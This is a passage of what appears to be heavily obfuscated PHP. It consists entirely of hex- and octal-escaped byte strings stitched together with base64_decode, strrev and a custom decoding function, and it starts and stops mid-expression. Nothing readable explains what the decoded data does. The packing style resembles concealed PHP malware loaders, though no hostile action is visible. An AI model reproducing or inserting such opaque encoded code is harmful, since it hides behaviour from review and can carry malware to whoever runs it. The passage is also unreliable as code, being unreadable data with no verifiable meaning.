xb0\x8a\xe3\x28\x47\x26\x3d\x1f\xc7\x67\xbb\x1\x1e\x43\xfb\x31\xcc\xd3\xd1\x0\x6d\x26\xd5\xbc\x16\x95\x7a\x18\x8f\xc7\x7c\xd\xa1\x40\x9c\x91".base64_decode('FiDBLE7IYQO/KUFdE6SUEQZJEEUEQ7DkzZUZhVAEeqiqI5dGZjGPz0cKmnE0tgrihJT6uQ==')."\xa\x1d\x72\x28\x17\x97\x27\x20\xcf\xcf\x3d\x58\x92\xa9\x89\x45\x8f\x49\x13\xb4\x29\x2f\x66\xc8\x44\x47\x12\x76\x28\xf0\x56\x75\x75\x15\x3b\xb5\x54\x77\x27\x42\x7c\xd5\xdd\xd3\xbd\x7a\xca\xda\x6a\x26\x2d\xf1".base64_decode('dqE/LOIrc30R52QwjhhcD24HF1PbIjybRo0CP1nkbed3y7DUjK2KGE6ByeWcLwhs6WyHBA==').base64_decode('xcK8sHTvQ+hoGxeQco5SunjAJaKa5eEQLikzjuK2O7j6Clgleg4tJ7+0x1GxeZQc+22XRQ==')."\xa6\xa6\x16\x92\xe9\xa6\x62\x26\x63\x71\x69\x4b\x46\xef\x83\x2f\xc0\x5a\x81\xbb\x2b\x37\xfd\x51\x26\x95\x2b\xda\x64\x14\x98\xf0\x71\x22\x34\xa3\x62\x62\x39\xc0\x60\x2e\x67\xa4\x12\x32\xaa\x89\xdd\xb5\xd9\x87"."\370\230\230\122\305\356\131\224\140\233\322\20\16\207\2\276\66\5\157\344\260\1\41\56\41\32\150\367\241\335\13\213\61\243\261\100\204\246\7\33\335\254\336\45\156\46\303\340\1\35\206\335"."\xc8\x53\x6\x5c\xb3\xe2\x19\x83\x11\xf\xbb\x14\x4\x9f\xcd\x5c\x58\x16\xe1\xc2\x4c\x85\xb\xb5\xda\x85\xc5\x17\x2e\x71\xf2\x75\x89\xeb\xb\x57\xbf\xae\xd\x90\x0\x3f\x95\xba\xe0\xb0\xea\x12\x82\x17\x8\x6"."\33\135\272\331\110\16\335\344\3\44\213\65\301\112\143\251\162\106\35\162\321\346\204\264\176\55\343\142\42\31\27\153\243\213\11\242\134\104\200\324\10\315\352\100\313\11\232\105\202\210\152\246"."\135\30\201\60\376\272\304\205\212\313\30\310\151\5\2\2\3\43\316\353\56\161\226\167\365\26\214\142\276\235\175\123\212\321\146\101\202\150\63\117\210\30\206\345\142\262\55\227\54\344\202\126"."\370\330\72\51\73\234\345\173\103\306\337\331\10\300\57\234\125\72\112\137\63\131\245\363\141\227\357\255\246\65\202\60\163\55\333\345\154\60\104\316\306\331\116\74\340\42\264\110\54\124\334\201"._kodDe('LwQV3Z2kV4dhVxJ9vdGXM92JyxX4GMZgdJbNftCCkUM3i+nllF6hUVC+tFQYWC+RJ3YUMYE=')."\254\323\50\11\213\354\261\42\252\41\252\366\70\272\345\42\353\250\334\32\50\77\307\34\257\371\224\34\163\364\321\154\214\31\262\363\371\265\255\221\257\137\235\320\57\102\2\303\171\301\104\320"."\xc6\x62\x32\x1c\x45\x9b\x5a\x53\x86\xd\x4a\xad\x9c\xd\x4\xd8\x65\x8f\xe1\xc5\xe5\x21\x4\x99\xdc\x50\x47\xb9\xd0\x30\x14\x68\x8a\x29\x67\x87\x11\xf5\xd2\x8d\x38\x2d\x13\xc7\xc0\xa\xf9\xc7\xc8\x29\xb6\xba"."\331\160\51\365\44\137\304\325\134\212\246\54\107\224\176\171\175\5\373\110\205\255\270\100\23\173\43\134\54\152\373\232\230\161\171\20\60\72\220\356\213\335\211\45\205\305\146\130\4\316\117\65"."\xe1\xf0\x85\x45\xae\x10\xd2\x58\x9a\x98\x5a\x19\x2f\x25\x72\x23\x12\x58\xbb\x6c\xdf\xc5\x51\xb1\xa6\x18\x4a\x28\xf8\x3\x50\x1\xe1\x55\x30\x49\x71\x8b\xd5\x21\x45\xed\x43\xee\xc0\x48\xc7\x16\x8a\x87\xa8\x5d"."\xcf\xd\xe9\xb9\xa8\x8e\xcf\xe6\xce\xd4\x35\x7c\x17\x16\x4c\x0\x5e\xdc\x22\x46\xb1\x72\xb4\x30\xdd\x44\xb0\xe8\x8b\xd6\xef\x82\xeb\x5f\x57\x46\xcf\xf5\x49\x1b\xb4\x90\x6c\xa2\xd6\xe3\xa2\x52\xdb\xa1\x26\x47"."\313\241\42\11\104\214\0\254\147\300\370\264\132\20\203\311\250\20\46\5\274\17\46\6\21\121\11\254\107\355\27\14\212\255\214\104\113\114\153\210\265\136\16\332\53\245\321\106\27\371\155\101".base64_decode('jZeXK58eTEcYECVBiBaE0FihH9KRmOHCsnv0Q7dxpglAgBjeF7ONcBeAw4sQAQDEwQNexQ==').base64_decode('CAgwE3FJFsAJkJ0doC3xcfKO+PUM2s0KHrxGmvGexMaEkjcZ56Ia6idUL2qIluTJ0EKGig==')."\xc9\xbd\xd8\x1e\xf8\x5\x18\x5f\x62\x62\x7c\xc5\x7a\xea\x15\xd\xc2\xc3\x19\x2f\x6d\x7\xc6\xe0\xf2\xf1\xa6\x82\xc1\x99\x5b\xbe\xb3\x3b\x81\xfc\xe4\xf4\xc8\x15\x3a\x1c\xbb\xb1\x34\x1e\x36\xe\xa2\x24\x49\x2a"."\343\344\45\34\251\216\50\346\57\34\313\132\320\100\46\34\243\327\61\5\272\201\171\320\231\0\364\163\134\65\22\273\45\350\314\152\172\45\6\33\336\132\307\74\133\206\201\16\232\5\117\1"."\x7d\x59\x34\x48\xa2\x71\x40\x20\x88\x8e\x6\xde\x7\x65\x26\x81\xd7\x62\xa2\xc\x89\x5a\xdb\x79\x21\x56\x32\x9a\x57\x19\x91\xe6\x7c\x1a\xc3\x5e\x72\xaa\x28\xa\xc2\x49\x9a\x2c\xda\xc3\x5b\x41\x33\x42\x9c\xb9"."\305\344\41\220\322\55\234\202\327\233\301\356\201\4\240\330\41\235\205\105\134\46\331\144\347\51\231\173\161\162\160\215\267\101\332\271\5\110\234\110\266\164\217\140\156\312\253\45\45\215\74\40".base64_decode('hKSqlzX6NSkR37vlRY4UpdlSlqhUguJzRFqElleKsMRiFAgslCXnabqCPfgE4RGjHGz0FQ==')."\12\14\177\151\67\361\235\60\112\224\223\60\371\213\262\305\127\156\273\242\225\7\372\205\42\36\255\12\177\330\103\127\77\276\170\14\263\113\176\71\134\12\52\13\25\313\127\24\25\227\357\366"."\130\171\160\137\46\43\324\245\234\361\121\213\320\125\57\27\222\123\106\55\326\104\16\263\114\323\240\134\32\77\306\214\316\232\73\57\300\355\224\172\164\226\205\255\115\347\211\203\117\143\371\70"."\xda\x9c\xfd\x69\x3d\xa7\x31\x91\x4b\x8f\x5e\x30\xcb\x91\xac\xff\xcf\xbc\x71\xe9\xc8\xe3\x15\x32\x1a\xba\xe0\x3c\x49\xfc\x8c\x15\x82\xfb\x35\xf9\xcc\xc0\x45\xad\x82\x44\xf1\x5d\x7b\x8d\x93\x17\x1\x7e\x40\x8a"."\xc4\x2d\x1b\x4b\x15\x21\xf5\x4b\xcb\xc9\x86\x21\x68\xf9\xd2\xf1\xc0\x3b\x56\x30\xec\x31\x47\xc1\x59\x27\x1c\xd7\x2d\x21\x34\x71\x90\x6f\xb4\x72\x21\x9c\x85\xe7\x52\xae\x54\xb0\x70\x5f\x1\xcf\x2b\x17\xec\x9c"."\xc\x87\x70\x17\x67\x8c\xd6\x56\x96\xcd\x6b\xb9\xe0\x96\xd7\x1f\x79\xfa\x63\x1a\x7e\xf1\xe3\xfd\x4f\x5d\xf8\x43\x1a\x9e\x3e\xb\xee\xe7\xd7\x1c\x8e\xfe\x2d\xd1\x7\x5f\xb7\x64\xc8\xd8\xfb\xb3\x6f\x7f\x63\xd9"."\55\77\110\136\375\373\151\337\235\361\353\137\154\361\116\373\175\102\73\175\107\146\351\316\277\326\177\147\314\131\205\226\137\175\247\160\347\237\136\371\376\133\237\367\376\152\372\236\317\256\252\10".strrev('ó÷9¯»ï}?ßç¡úìx½53Ì`yÛÿøV?¬ç}•ÿ£–ò¾™ïwãş[²Ï+ı3¿œì')."\247\136\75\163\351\121\377\74\364\235\237\56\74\144\355\15\177\365\217\31\363\302\142\353\337\317\276\371\326\324\105\37\376\345\57\165\167\34\362\362\137\216\360\234\271\272\152\373\273\277\131\342".strrev('íŒÏÕßáÙx==×uÎõ®ÿ¯WÅD¼ï9æ.¾O»ÆO–®ÙğşçùŸøæx{Éàş').base64_decode('rv/rLdG9F63e0ffT4GunDf7ziD8FPdFDrn8wMfLBy+/r73uDtV++O+OXa1756wfG/Sd9aw==')."\305\113\107\236\151\274\176\143\347\163\273\267\214\373\217\271\343\366\104\117\333\364\340\33\267\115\357\377\374\232\105\257\35\345\357\231\177\310\123\273\257\177\273\371\272\75\77\76\355\100\335\77"."\xd6\xb6\x9d\x71\xd3\x37\x3f\xff\xe8\x8b\x65\x67\xde\x73\xcf\x3d\x13\xee\xbd\x61\xf8\x7\xbb\xff\xfa\xea\x4f\x36\x5e\xb3\xbb\x72\xee\x75\x1f\x1f\x7b\xda\x23\x4f\xff\xd8\xb3\x35\x9a\x1b\x5b\xb3\xee\xa2\x1b\xeb"."\217\375\350\320\77\174\273\371\325\47\366\156\33\76\146\325\334\47\357\37\153\155\375\327\111\165\57\265\234\323\366\301\131\147\37\76\263\146\226\327\37\337\372\136\103\372\232\43\333\317\334\262".strrev('|q˜˜!;®Iï“ğáÏ&ç÷Ü4º“ó|¯™öËDp=ÏŞb|#ÄÖyºà`óì}')."\365\307\337\177\343\236\203\167\351\301\145\33\302\3\167\136\370\311\326\371\227\237\172\351\25\267\36\236\371\315\215\253\32\216\137\76\163\307\233\247\315\277\353\246\347\256\334\133\254\371\361\375"."\x4f\x5f\x33\xff\x8d\x7f\xdc\x32\xf5\xf9\x43\x4e\x78\xe3\x99\x7f\x6f\xbf\xe4\x84\x33\xfe\xf9\xc6\xb2\x44\xf2\x5b\x4b\xfe\x73\xe9\x8a\xd6\x6f\xcc\xde\xa1\xbe\x70\xaf\xe7\xbb\x67\xd6\x9c\xb2\x78\x72\xed\x8f\x1e"."\x3c\xe2\xae\x3\x43\x93\x1f\x1b\xb3\xfb\xb4\xf3\x9e\x9e\x38\xe1\xf8\x13\x9e\x3e\x6d\xf0\xdd\x8a\xe3\x36\x3c\xbf\x63\x71\xc3\x74\x6b\xff\xcf\x8b\x6f\xde\x3f\x7e\xf3\x21\x77\xbb\x16\x8d\x54\x6f\x18\xb8\xf9\xba".strrev('÷Šˆè|?MøêdBf>¾Ç-ÄíxÌ÷Zj÷Íç½öOoƒË^p^\'}êèüÖ+ÿç[ıú^7')."\x2e\xdb\xfb\xab\x83\xc5\xe7\x33\xeb\x7f\x7e\x70\xf7\xba\xcb\x6e\x7d\xf7\xa7\xe7\x3f\x93\xe9\xda\xb1\xf6\x95\xe6\xea\xef\xae\xcf\x6d\xfa\xd5\x4f\xf5\x17\xf\x1d\xec\x7f\x62\xdb\xdf\xde\xd9\x7b\xde\x81\xed\xc7"."\26\17\73\70\347\366\143\365\3\257\174\272\156\167\203\62\357\241\364\344\3\63\177\261\156\312\263\327\315\176\272\143\246\373\233\231\324\213\347\375\243\156\325\353\207\327\205\146\26\56\136\262"."\376\216\23\236\373\344\335\303\306\64\135\376\355\31\323\67\156\352\176\165\307\105\313\257\214\274\371\360\356\212\167\132\117\270\345\232\27\326\270\116\354\132\161\271\167\301\205\247\217\335\275\176".base64_decode('/YmNk3/e8VCV59Oas8+//aLjrntq29WX/GnPrKNO/8N3lp9yzrx/Xv/9ZZH0pe620xKTjw==')."\62\213\221\27\253\216\256\74\152\341\5\233\56\133\377\273\45\143\36\126\357\176\343\336\315\17\55\272\177\347\131\233\56\170\266\367\344\273\166\335\161\327\320\161\17\47\56\173\342\360\317\236".base64_decode('+u7YI0+MXvKtIy/71n9d/IvvbHj/N6+pLy+adcOYqb+o+s63l3u2/LPvm/cu2TbjioeWXQ==').base64_decode('/eqmiZ3L7tjz7ksnu47o+svFFRMe6FcCyzZ9euKdx94ROnfhlZsrxi41O1Z88zcNVfq37g==').strrev('ğã:>k‡ÿ=åOóæÑÌ~{^»[Îñn?^wO‡Ñ{ÒüÚi|¬ÏíÚ‰#Ö)æå¹]')."\176\365\321\155\143\366\376\153\121\347\37\256\171\44\174\344\147\157\65\371\127\276\354\276\177\311\17\347\77\251\337\266\376\371\53\63\255\306\222\323\227\177\343\342\333\337\277\130\373\106\144\373"."\67\356\30\173\345\347\357\57\277\164\322\236\267\36\370\367\357\27\14\337\370\333\143\352\237\257\271\41\323\265\353\203\357\177\340\273\245\166\351\324\314\13\17\155\273\173\221\357\223\272\246\226"."\135\326\261\47\136\360\363\316\77\377\355\247\323\123\277\373\133\242\373\215\37\375\267\161\322\67\334\275\213\177\363\213\261\363\66\277\374\317\33\264\277\156\377\365\301\237\74\261\141\376\230\23".base64_decode('h/7Ytu31X9dtXnF79OBRRx/506K26Z5pu+tPrl2m3/FGOvZOsOWD+yeceGzHVRu3H//K3A==').strrev('TÿcŞàz¾,g•ÚÅõÁ¤bıÆ;oÜöİÇ©æg¿™OßÇşq?	æy nİ¾Ÿyçk·Xjÿ')."\xff\xcf\x21\x7f\xf4\x5b\xde\x65\x7f\x5b\x7f\x81\x71\x7e\xf1\xd8\xb7\xcf\x6d\xb8\xf8\xe4\x2d\x47\xff\xfa\x85\x7\x2f\xff\xf0\xee\x91\x9b\x1e\x5d\xf3\xc5\xdb\x3b\x72\xfb\x16\x2f\x7a\xfd\xe4\x53\xb6\xbc\xe7\x7a"."\xeb\x52\xf3\xc8\x71\x5a\xff\xc5\xef\xd4\x3f\x7b\xe0\xcf\x33\x5e\xf6\x7e\xf1\xd9\x2f\xef\x7e\xfd\x7b\x4f\xae\xfa\xfb\xbb\x1f\x6e\x7b\xf9\x89\xa1\xf\x3e\x7c\xe7\xa5\x1b\x7\xb6\xfd\x61\xcd\xd0\x17\xef\xc4\xf7"."\x9f\xf9\xd8\x63\x9f\xfc\xc3\xb8\x76\xdb\x39\xf1\x2f\x3e\x58\x3c\x65\xcd\xd3\xdf\xb\x7f\xf2\xd4\xfb\x5f\x3e\x14\x7e\xef\x73\x97\x3e\xcf\xfd\x71\xe6\xec\xe7\x4e\xfa\xf3\x11\x73\x1f\xf0\xfc\xe8\xb8\xfd\xcf\x9c"."\x7d\xd4\x6\x6b\xcb\x2b\xcf\xfc\x21\x7a\xf2\xd4\x3d\x87\x5e\x7c\x7b\xeb\x4f\xd7\xdf\x72\xda\x4b\x6f\x34\xcf\x3f\xf3\xe2\x57\x3a\x2f\x39\xbe\xfa\xf9\x8f\x6f\x7c\xe4\xa6\x87\xb5\xc3\x43\xef\x4e\xb9\x6e\xc5\x8b".strrev('Ò¾ªƒÃ‹s¹×ò¶6_/Gö÷¾İÖ›‘Á‘¯øÎË¤ğşmo–ş{~ß:«¸ë4xvİ0x›')."\330\371\73\367\51\241\275\343\272\317\231\372\307\17\36\76\377\270\5\233\276\377\156\146\332\206\13\157\116\154\370\54\362\243\211\225\55\337\33\167\332\171\57\114\75\154\337\365\33\136\251\270".base64_decode('+qqOSx5+ec/cKUllxVUnnHT+9inq7L0/fHbotv5xv/zJ6x/lfvbQaYNnTJh67ykbPv/vKw==')."\126\336\362\152\157\260\371\246\61\267\53\267\346\37\370\375\316\317\157\30\163\346\316\255\311\171\177\64\127\236\165\124\370\344\247\334\37\337\233\333\367\17\175\317\251\247\337\174\345\317\13\367"."\165\176\353\137\311\233\346\270\26\235\261\370\337\217\256\73\156\353\326\323\213\27\366\337\125\377\163\143\332\300\313\323\27\335\364\105\372\301\305\306\226\337\375\366\273\167\375\360\302\357\326\257"."\xda\xb5\x75\x65\xd3\xde\x9f\xdf\xf9\x60\xf7\x41\xfd\x9c\xdb\x97\x35\xd5\x4c\x59\xf6\xf2\x23\x8f\xce\xee\x7b\xf3\xf4\xab\xfb\x7f\xf7\xd9\xcd\x2f\xbd\xb9\xe0\xf2\x63\xd7\x15\x3a\x4e\x5a\x7d\xf6\xba\x85\x4b\xbf"."\x73\xe6\xb\x13\xd6\xdd\x74\xc2\xe2\xc6\x8f\x5f\x1c\x1e\xf3\x9a\x67\xe1\x6b\x33\x7a\x9e\x3e\x72\x6f\xe5\xce\x25\xc7\xab\x9b\xe\x53\x1f\x7f\x62\xe0\xb0\xb6\xf3\xb7\x8d\x79\xf3\xb6\x7\xa\x8f\xae\xda\xb5\xfd"."\x93\x4d\x77\x5e\xfb\xe7\x5d\x3\x9f\x36\xb7\x9c\x38\xb7\xf1\xe9\x53\x5e\x1f\x7b\xf7\x67\xbf\xfe\xce\x96\xf0\xa1\xd5\xdf\xfe\x8f\xd4\xf3\xef\x66\x1b\x3e\x3e\xf4\x3f\xef\xef\x7d\x60\xd1\xf\xa6\x8d\x3b\xe2\x7".base64_decode('h/1n/nNlz/0zajpmvfrBvdkdq48bd+HeO0YWdp3xnPbNU386acJhxnF/vfSvJx9+6t4j/w==').base64_decode('Mn3vqc/dp53341ByyfsPLL7Mc/JHB/ac9MTAswtv/uPU1vGnbvpZ6yl73gt9MuHLu6/68Q==')."\355\377\276\246\352\167\273\67\377\370\305\147\66\334\72\22\270\252\375\301\256\217\76\371\301\367\172\236\271\64\163\323\333\317\372\67\54\264\156\330\123\263\371\324\23\174\67\34\163\326\333\207"."\115\375\50\73\357\227\347\334\221\253\75\362\207\213\132\27\177\63\71\356\306\355\265\333\57\376\313\347\217\35\275\161\353\251\315\332\321\333\17\71\345\213\315\317\325\171\57\154\34\171\261\161"."\323\303\35\217\152\231\177\274\376\213\177\355\136\260\361\255\134\366\263\364\354\201\327\176\274\356\171\337\53\117\257\137\337\371\332\155\133\167\36\371\341\307\77\373\323\173\271\373\247\65\354\75"."\354\265\211\57\275\363\302\253\107\106\257\356\330\265\160\365\63\203\7\162\67\136\75\345\320\217\217\372\364\323\337\336\364\170\341\341\355\217\354\262\326\270\56\373\335\161\7\326\236\131\175\346"."\33\43\261\277\53\343\314\213\32\327\57\275\346\374\227\237\154\275\113\371\162\307\47\275\356\153\237\376\342\201\255\3\373\36\270\156\40\172\350\253\133\36\155\374\306\133\47\177\336\74\173\333"."\367\67\52\227\174\357\315\207\236\363\17\6\176\277\323\363\304\151\53\326\317\351\213\136\132\61\164\154\342\301\137\54\77\161\335\302\360\115\147\137\364\300\117\272\236\370\144\377\163\177\367\172"."\xcf\xfd\x72\xcf\x6f\x4f\x79\x72\xee\x97\x7f\xbb\xfb\xef\x5f\x7e\xfe\xde\x67\xb7\x5d\xe1\x9d\xb7\xea\xdc\xf\xee\xf8\xde\xf7\xfe\xfe\xe1\xd5\x7f\xdf\x1f\xbf\x28\xf0\xd9\x3b\x7b\x2e\xff\xe5\x97\x6b\x4e\xff\xe2"."\334\317\257\375\345\353\333\74\363\76\175\373\263\235\337\233\371\345\47\317\374\162\333\27\53\77\372\364\216\57\277\174\277\367\261\173\56\137\361\305\31\175\275\165\47\374\127\364\265\367\77\235"."\x7a\xcf\x75\x3b\xdf\xfb\xe3\xaa\x1b\xb7\x3d\xfe\xf9\xcd\xdb\x3f\x5d\x74\x57\xd7\x5d\xb9\xf7\x7f\xd3\xff\xcf\x77\xfe\xbd\xb1\xe7\xee\xdf\x1f\xfc\xf8\xf8\xe3\xaf\x38\x63\xee\xaa\xe3\xfe\xb5\xfb\xd0\xd6\xbe\xe5".base64_decode('Pzjuqr0Jo3HNd7Zuqnz1wbc+PPvcYnZt8sErH/kyeetdf9vc8tRnUy56ZczgljMv+qB9yg==')."\xd2\xed\xe9\x4d\x97\x79\xc7\x6\xff\xb8\xe5\xfe\xfb\xb7\x5d\x7d\xd7\x8b\xe7\xbd\xb2\x71\xd2\x8e\x43\x9f\xf9\x60\xe7\xc3\xa1\x9a\x9f\x7f\x78\x12\x7b\xd0\x96\x28\xf4\xf6\x65\xd2\x70\x8b\x3b\xb9\x6\x14\x9e\xa6".base64_decode('TYGXOLXANU0HdaF80VAHmKYcCNCmzQIVsqnTIdCTTa3oz8Dpb8qMGVDXLDgxmMbQQA5OPA==').base64_decode('k2fCPe4s9omZtfDtvoLVn1nBLpj1VH/vSvjw9KkAsmrQMnLshDuFtRU4vMnsw4lioX8Fuw==').strrev('_cìT?Ù¤Ş—…1ôÊ‘_ìıã¬gŒÉ^õ0'."\r".'Wû0ÈP)äßAÒODÌä'."\r".'@')."\42\123\247\262\41\234\66\213\265\17\252\55\144\63\375\306\0\134\217\17\232\253\254\254\316\56\52\12\375\172\137\2\70\372\131\323\240\143\63\147\101\140\352\24\250\312\110\47\263\375\11\120"."\137\236\126\13\255\312\256\114\245\325\101\46\160\105\107\357\364\0\364\147\346\164\50\270\242\47\253\255\144\357\241\146\114\203\46\316\234\14\55\253\255\205\271\110\150\103\231\236\125\320\301\241"."\276\301\364\52\25\256\214\321\134\254\312\47\331\230\316\232\306\252\202\202\123\246\63\4\142\363\233\134\231\260\12\175\40\114\254\235\61\213\145\63\44\232\12\160\346\312\114\42\145\0\166\254"."\xca\xc\x15\xfa\xd9\x0\x27\x52\x2b\xcc\xc1\x21\x98\xb0\x42\x31\xb9\xd2\x1c\x82\xd1\x1e\xea\xef\xd1\x6\x32\xc\x2b\x67\xb2\x1a\xe9\xaf\x96\xc8\xe\xa4\x8d\x15\x34\x92\xca\x65\xb4\x22\xeb\xd0\xf4\x29\xd0\xda".base64_decode('qZOhtUnLHMoNrIKC+f5sygDYHs1Im0y9tpaNWHplMdnLnjpMmwX4NpmhmKqlB3sHEjBIbA==')."\176\146\114\207\76\117\236\306\123\40\60\250\47\62\51\266\64\146\115\205\36\114\237\14\331\275\152\252\177\150\5\364\263\77\141\245\64\366\232\253\57\127\50\232\53\0\23\6\163\152\257\316".base64_decode('EKt3oJhYOQRNrK2BjuZ0a9UKppqhGqvy/UzOaw6uUDO9MMvZ3lVFi4mlirlU0kjD+A/lig==')."\275\52\133\342\3\103\331\344\140\6\276\136\354\121\127\244\372\0\343\152\147\301\120\254\352\351\323\223\53\101\216\230\35\114\31\305\25\60\56\323\141\324\246\116\205\45\203\365\142\271\26\177"."\xca\x18\x50\x2d\xa6\x5b\x30\x83\xf\x61\x2d\x9b\x64\x16\xd0\x8d\x4c\x5f\x2a\x1\xf5\x37\xa8\xc9\x3e\x26\x47\xe5\xba\xaf\xb2\xd2\x28\x55\x7f\xa2\x2\x2b\xf9\xe2\x81\x3d\x24\xd4\x73\x9e\xac\x9a\xe3\xaa\x27\x2d"."\x6c\x38\xa4\xb4\x3e\x4d\x63\xea\xe7\xd0\x11\x4b\xa8\x33\x80\xbe\x2a\xa4\xeb\x59\x4d\xc8\x86\xa9\x4\x9e\x95\x14\x87\x5d\x2c\x69\x90\x14\x22\x70\x34\x2a\xd7\x92\xcc\x59\x52\x36\x8a\xd9\x72\xa3\xb2\x86\x3c\xf4"."\16\267\320\43\367\172\151\226\51\373\226\271\311\3\171\250\151\16\30\5\30\261\76\43\225\314\30\305\224\255\326\124\302\123\146\44\151\117\312\345\364\70\323\271\332\214\250\320\246\11\316\322".base64_decode('bKOWIDPKdXTwnzWMXOAnsSbWaeYvuCi0h01MQkIHKtq2VLPPIye75Vw9h9qbyXjsj6Txaw==')."\xe5\x8e\xf6\x78\xcc\x17\x5d\x20\xe9\xbe\xe1\xd7\xb4\xc\x77\xe2\x42\xcd\x5f\xea\x87\x98\x34\x69\x4\xe5\xb9\xb3\xf7\x99\xe1\xc6\x81\x6d\x8f\xe\x5f\xb1\x65\x64\xf3\xf6\x91\x8d\xf7\xd\xef\xbe\xfa\xc0\x7d\xdb".base64_decode('hx/fjKL7dm0avu/mg9ev27dr475d5x1Y/9D7j20YvmLbgQsfH9565/CP1u979PEDT67ffw==')."\xe7\xe5\xfb\x76\xdd\x3b\xb2\xf5\xd2\xe1\x75\x3b\xf6\x3d\xba\x65\xf8\x92\x5b\x86\xd7\x5f\x31\x72\xf5\xc6\x7d\x8f\x6f\x45\xf0\x23\x97\x88\x9a\x11\xd8\xf0\xbd\xd7\xe1\xb2\x8f\x5d\x30\xbc\x6b\xd7\x81\x5b\xef\xe4"."\271\357\77\166\76\254\136\130\215\315\232\245\104\27\206\230\102\23\101\110\145\256\2\250\250\231\36\245\75\243\241\21\123\222\370\351\20\326\176\262\322\132\101\261\210\26\224\212\376\346\214\234"."\x9b\xa2\x1a\x7d\xe0\x6d\x2a\x7a\xe\x67\x2b\x6c\xac\x3d\x1c\x1d\x63\x5a\x36\x8f\x91\xa\x46\xc9\x4b\x5f\x7a\xda\xde\x13\x48\x98\x57\x6e\x98\x69\x46\x19\x3c\xc2\x63\x2d\xe6\xaa\xa\x7\xe1\x42\xb\x8b\xcd\x94".base64_decode('HhUlpOqUHlRMYe+ZFMtg4ewQn3QH+pedVt4MNrW9XHothKrQMOmhCL2xKEEpsp7sxMC20g==').base64_decode('7GREzrKPBEg9yeW7S6FNcSnkylWxP2vGl+nsglpeM3LzC1o+w+9esOCw7CA6uhAtM1y8Ew==')."\266\114\264\36\213\126\31\100\171\124\145\151\252\156\370\63\210\224\211\273\100\162\355\55\232\113\243\102\212\213\76\304\51\141\101\113\351\114\55\127\313\22\110\240\200\36\351\16\205\276\375\341"."\272\301\111\204\366\5\333\365\320\234\171\371\164\36\333\210\260\146\317\3\45\165\366\10\114\152\3\204\305\133\46\71\65\343\274\162\342\213\244\261\101\262\324\200\301\352\334\156\267\44\32\25"."\xba\x59\x38\x4\xd5\x89\x9b\x57\x94\x16\xc0\x2b\x78\xb4\xf4\x46\xae\x90\x80\x96\x76\x6f\xaf\x66\x5a\x75\xe4\x49\xa8\x32\x49\x41\xd\x9d\xe9\x99\x8c\x2\x64\x11\x4c\xf3\xcc\x40\x41\x32\x62\xb0\x70\xbb\x60\x14"."\x8b\x26\x7b\xa0\x33\xde\x33\x15\x38\x3\x73\x36\x68\x53\xcc\x26\xf4\xa3\x5e\x6a\x3e\xa4\x8b\x52\xc5\x5c\x86\xa5\xa2\x20\x2\x89\x14\x73\x78\xb6\xeb\xec\x7d\xd6\x72\x29\xa9\xd0\x6c\x35\x69\x49\xb5\xc6\x7b\x60".base64_decode('UD1iPNRJIl9LwUM3rzRKAwDAyrbacQD1383RAk2vhVpgEs1O2DWgSlN6QR8RGIWLk+H6ig==').base64_decode('opY85fmkkctxlU4zo7KrOxM/NclpHP+KplBoVwXVwCGxnGkOflsclJ5IxNEub0rw8V7NYg==')."\xcf\x48\xa0\xdd\xd\xbe\x68\xd0\x1f\x6f\xf7\xb1\x87\xf\x6a\x3e\xef\x35\x53\x7d\xa6\x17\x6b\x27\xea\xfd\x5a\x48\x4f\x78\xf1\x6b\x7d\x8c\xa1\x1e\xfe\x9e\x9d\xec\x2\x71\x35\x61\x14\x2c\x36\x7e\x68\xdd\xc4\x53"."\x3a\x34\x34\x14\x6c\x88\x37\x6\x23\xd2\x97\xf3\x45\xe7\x97\x65\xcb\x2a\xbe\xf6\x60\x3c\x1a\xd\x4b\xed\x20\xf\x85\x97\xc4\x17\x84\x1b\xe3\xfe\x70\x78\x41\x10\x96\x4\x20\x41\x9d\x44\xa9\xf1\xfb\x44\x71\x7f"."\214\143\342\235\42\276\163\221\25\306\144\46\10\233\276\300\333\175\124\1\305\112\264\366\374\55\276\10\127\147\237\346\251\361\114\26\260\350\203\161\254\316\137\317\336\322\107\143\276\110\31\3"."\x28\xd4\x30\xa\x20\x8\x18\x43\x81\x2\x2d\xe1\xc5\x8a\x3f\x1c\xea\x68\x6d\x8b\x52\xbb\x1f\x34\xbd\x2d\x2c\xe5\x13\xa5\x65\xc8\x66\xe6\x51\x4a\xb3\xa1\xfa\x40\x7b\xc8\xe7\xf\x28\xc1\xb6\x58\x98\x3d\x47\xe0"."\172\243\344\41\112\224\307\331\20\24\114\215\233\77\201\362\64\42\77\226\221\153\344\65\301\222\352\164\125\166\125\164\115\354\252\352\252\136\356\351\62\273\201\370\221\31\321\345\351\201\110\173".base64_decode('I3SvjodSJuBRaxQxHTQYjvj8IdYUhJUQDPuDNLD/mvv37d60/8b7hi/diCoaueGCkWt3IA==')."\126\11\263\107\367\155\330\377\304\246\221\153\266\215\154\0\266\106\71\260\155\347\276\307\237\334\177\315\235\303\367\135\67\262\345\221\375\67\134\104\63\16\336\165\377\360\145\167\362\206\51\7".base64_decode('r35iZNPtnGWinJILlT64buP+x+/DDNNt5408fPnI1o3Dl906fP2d+zdtG/7hhcMXbzywbQ==')."\363\130\47\42\321\170\47\233\12\170\42\355\75\7\77\157\247\303\333\145\116\302\103\133\215\176\253\360\43\7\364\313\164\265\211\376\356\302\216\100\233\77\340\174\55\44\107\301\166\314\104\212"."\x21\x54\x97\x5\x78\x64\x13\x6c\xcf\xb0\x38\xb1\x33\x51\x5f\x39\x6a\x2b\xd6\xc0\xfc\x4b\x8d\x92\x1a\xd3\x18\x88\xfa\x23\xc1\x86\x0\xa8\xd1\xf3\x89\x1a\x4f\xf8\x3b\xd0\x64\x40\xa9\xd1\xc8\x22\x1e\xe6\xcf\x4b"."\113\154\375\50\125\14\231\253\25\133\107\124\117\322\310\24\263\71\322\130\245\2\53\126\125\270\60\265\41\117\227\224\12\274\267\243\4\15\77\212\257\302\126\100\210\32\156\345\322\112\127\215"."\x6b\x72\xb5\x2\x86\x80\x68\x9\x30\xff\xa3\x54\x80\x36\x37\x2f\x67\xfb\x88\x2b\x61\x8b\x4d\x76\xd5\x54\x2b\x15\xf9\xbe\xa\x68\x97\x18\x57\xd4\xfa\x38\x85\x34\x15\xd5\x55\x5\xd\x96\x9b\x2b\x60\x11\x35\x33"."\xad\x82\xaa\x23\xf2\xa6\x24\x5d\x3c\x89\x97\x47\xbf\x36\x93\x3e\x49\x8f\x28\x41\xe7\x9\x41\x38\xd3\x14\x5f\x5b\xa3\x1d\x92\x5a\x2\x6a\xaf\x24\x5a\x90\x49\x8f\xc5\xcd\x89\xb0\x69\